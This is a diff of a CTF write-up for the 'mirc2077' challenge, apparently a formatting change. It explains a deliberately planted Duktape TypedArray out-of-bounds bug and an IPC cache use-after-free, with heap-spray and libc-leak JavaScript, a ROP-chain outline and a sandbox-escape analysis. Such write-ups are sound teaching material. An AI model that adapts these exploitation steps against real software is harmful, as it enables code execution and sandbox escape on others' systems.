@@ -9,7 +9,7 @@ mirc2077 is meant to be a bite-size 'browser-pwnable'. The player can send a lin
 If the link contains Javascript, it will be interpreted by Duktape (https://duktape.org). To make this interesting, an OOB-RW bug was introduced to the TypedArray object via a custom built-in.
 
 However, the JS-interpretation occurs in a heavily sandboxed child-process with seccomp. For the first flag, it's enough to get code-exec in the JS-interpretation-process but the end goal is to escape it by exploiting a bug in the IPC of the main-process.  
-```
+``` bash
 $ checksec --file ./mirc2077 
 [*] './mirc2077'
     Arch:     amd64-64-little
@@ -22,7 +22,7 @@ $ checksec --file ./mirc2077
 
 ## Backdoor / Bug analysis
 This is the mentioned 'backdoor' added to the IRC-clients repository.
-```
+``` diff
 +DUK_INTERNAL duk_ret_t duk_bi_typedarray_sect(duk_hthread *thr) {
 +	duk_hbufobj *h_this;
 +	h_this = duk__require_bufobj_this(thr);
@@ -47,50 +47,50 @@ With this out-of-bounds read/write primitive we can then find a suitable object 
 
 ## Code-exec in the sandboxed JS-interpreter process
 First we do some minor spraying with small TypedArrays where we trigger the vuln to create the OOB-RW-primitive. After that, some larger potential targets where we set magic values to search for.
-```
-	/* defrag the heap */
-	for(i = 0; i < pwn.defrag_heap_rounds; i++) {
-		f = new Float64Array(4);f[0] = 1111.4444;f[1] = 2222.5555;
-		pad.push(f);
-	}
+``` js
+/* defrag the heap */
+for(i = 0; i < pwn.defrag_heap_rounds; i++) {
+  f = new Float64Array(4);f[0] = 1111.4444;f[1] = 2222.5555;
+  pad.push(f);
+}
 
-	/* spray duk_hbufobj and duk_hbuffer objects via Float64Arrays*/
-	for(i = 0; i < pwn.spray_rounds; i++) {
-		var p = new Float64Array(4);p[0]=1337.0;p[1]=4445.0;
-		p.sect(); /* trigger vuln */
-		spray.push(p);
-		var q = new Float64Array(200);q[0]=6661.6661;q[1]=1116.1116;
-		targets.push(q);
-	}
+/* spray duk_hbufobj and duk_hbuffer objects via Float64Arrays*/
+for(i = 0; i < pwn.spray_rounds; i++) {
+  var p = new Float64Array(4);p[0]=1337.0;p[1]=4445.0;
+  p.sect(); /* trigger vuln */
+  spray.push(p);
+  var q = new Float64Array(200);q[0]=6661.6661;q[1]=1116.1116;
+  targets.push(q);
+}
 ```
 There are multiple ways of doing this but I chose to corrupt a `duk_hbuffer` object since these are conveniently created and used in relation to TypedArrays.
 
 Each `duk_hbuffer` object is pointed to by a `duk_hbufobj`
-```
+``` c
 struct duk_hbufobj {
-	duk_hobject obj;
-	duk_hbuffer *buf; /* points to duk_hbuffer */
-	duk_hobject *buf_prop;
-	duk_uint_t offset;       /* byte offset to buf */
-	duk_uint_t length;       /* byte index limit for element access, exclusive */
-	duk_uint8_t shift;       /* element size shift:
-	                          *   0 = u8/i8
-	                          *   1 = u16/i16
-	                          *   2 = u32/i32/float
-	                          *   3 = double
-	                          */
-	duk_uint8_t elem_type;   /* element type */
-	duk_uint8_t is_typedarray;
+  duk_hobject obj;
+  duk_hbuffer *buf; /* points to duk_hbuffer */
+  duk_hobject *buf_prop;
+  duk_uint_t offset;       /* byte offset to buf */
+  duk_uint_t length;       /* byte index limit for element access, exclusive */
+  duk_uint8_t shift;       /* element size shift:
+                            *   0 = u8/i8
+                            *   1 = u16/i16
+                            *   2 = u32/i32/float
+                            *   3 = double
+                            */
+  duk_uint8_t elem_type;   /* element type */
+  duk_uint8_t is_typedarray;
   ...
 ```
 
 How the `duk_hbuffer` stores it's data is defined by it's headers magic value. If it's defined as external, then the data will be stored in a buffer pointed to by `duk_hbuffer->curr_alloc`. Otherwise, the data is kept after the structure.
 
 In the case of f.ex. `Float64Array(200)` a non-external `duk_hbuffer` is created but we want it to be external as the goal is to be able to control the `duk_hbuffer->curr_alloc` pointer.
-```
+``` c
 struct duk_hbuffer {
-	duk_heaphdr hdr;
-	duk_size_t size;
+  duk_heaphdr hdr;
+  duk_size_t size;
   void *curr_alloc; 
   ...
 ```
@@ -111,8 +111,7 @@ The next steps for code-exec are
 * Using the baseaddress of mirc2077, read one of it's .got entries to leak an offset into libc.
 
 To understand the next part, one should know that all duktape objects starts with a `duk_hobject` that contains a `duk_heaphdr`.
-```
-
+``` c
 struct duk_heaphdr {
   duk_uint32_t h_flags;
   duk_size_t h_refcount;
@@ -123,7 +122,7 @@ struct duk_heaphdr {
 The `duk_heaphdr` contains a linked-list that can be used to traverse all the duktape objects. We can leak the `h_next` and `h_prev` pointers from f.ex. our duk_hbuffer object. These can then be used to find objects of interest via their `duk_heaphdr->h_flags` magic value.
 
 One of these objects of interest are the `duk_hnatfunc` one. `duk_hnatfunc->func` will contain a pointer to the mirc2007 binary. In my case, it would be the performance.now() native function.
-```
+```c
 struct duk_hnatfunc {
   duk_hobject obj;
   duk_c_function func; /* mirc2077 leak */
@@ -133,24 +132,24 @@ struct duk_hnatfunc {
 ```
 
 The following JS code will find the `performance.now()` native function object and from that, leak libc and rebase the ROP-chain that is used later on.
-```
-	this.leak_libc = function(addr) {
-		var elf_base = 0;
-		addr = this.find_native_func(addr);
-		if(addr)
-			elf_base = this.find_elf(addr, max_search);
-		if(elf_base)
-		{
-			this.elf = d2i(elf_base.asDouble());
-			elf_base.assignAdd(elf_base, this.got_offset);
-			this.libc = this.read64i(elf_base);
-			this.libc.assignSub(this.libc, this.libc_offset);
-			log("[+] Found libc base: " + this.libc);
-			this.rebase();
-			return this.libc;
-		}
-		return 0;
-	};
+```js
+this.leak_libc = function(addr) {
+  var elf_base = 0;
+  addr = this.find_native_func(addr);
+  if(addr)
+    elf_base = this.find_elf(addr, max_search);
+  if(elf_base)
+  {
+    this.elf = d2i(elf_base.asDouble());
+    elf_base.assignAdd(elf_base, this.got_offset);
+    this.libc = this.read64i(elf_base);
+    this.libc.assignSub(this.libc, this.libc_offset);
+    log("[+] Found libc base: " + this.libc);
+    this.rebase();
+    return this.libc;
+  }
+  return 0;
+};
 ``` 
 
 At this point, we could overwrite the `duk_hnatfunc->func` for RIP-control. However, controlling the arguments is not as easy due to how duktape passes the arguments via it's context-pointer.
@@ -161,7 +160,7 @@ The ROP-chain is very simple. It will `mmap` an RWX page, `memcpy` the embedded 
 
 ## Sandbox constraints
 To understand the sandbox-restrictions you can dump the seccomp rules with https://github.com/david942j/seccomp-tools
-```
+```c
  line  CODE  JT   JF      K
 =================================
  0000: 0x20 0x00 0x00 0x00000004  A = arch
@@ -190,7 +189,7 @@ The main process will fork a child-process and apply seccomp to it to do the 'da
 After the JS-interpretation-process creation, the main-process will enter an `ipc_loop` which expects `ipc_msg` structures. The `ipc_loop` will process each `ipc_message`can call the function that maps to the `ipc_msg->id`.
 
 To use the IPC, you would write the following structure to the IPC-fd and then read it back for the result.
-```
+``` c
 struct ipc_msg {
  u8 magic[8]; // IRC_IPC\0
  u64 id;      // f.ex. IPC_JS_SUCCESS 0xac1d0001
@@ -204,7 +203,7 @@ struct ipc_msg {
 
 ## IPC bug-analysis
 The IPC between the main-process and the JS-interpreter-process is meant to support caching. It doesn't do a great job though. The basic functionality consist of
-```
+``` c
 u64 ipc_cache_create_data(u64 id, u64 size) - Allocate cache data
 u64 ipc_cache_set_data(u64 id) - Set cache data
 u64 ipc_cache_get_data(u64 id) - Read cache data
@@ -214,7 +213,7 @@ u32 ipc_cache_close(u64 id) - Close cache
 ```
 
 The cache structures are as follows
-```
+``` c
 struct cache {
   v0 *data_ptr;
   u8 refcount;
@@ -230,7 +229,7 @@ The `ipc_cache_dup` will create a new `cache_head` and assign it the `cache_ptr`
 
 This by itself is bad but in conjunction with `ipc_cache_close` we can cause a use-after-free.
 
-```
+``` c
 u32 ipc_cache_close(u64 id)
 {
   struct cache_head *c = (struct cache_head*)ipc_cache_arr[id];
@@ -238,7 +237,7 @@ u32 ipc_cache_close(u64 id)
     return IPC_ERROR;
 
   if(c->cache_ptr != NULL) {
-    c->cache_ptr->refcount--;
+    c->cache_ptr->refcount--; 
     if(c->cache_ptr->refcount <= 0) {
       if(c->cache_ptr->data_ptr != NULL) {
         free(c->cache_ptr->data_ptr);
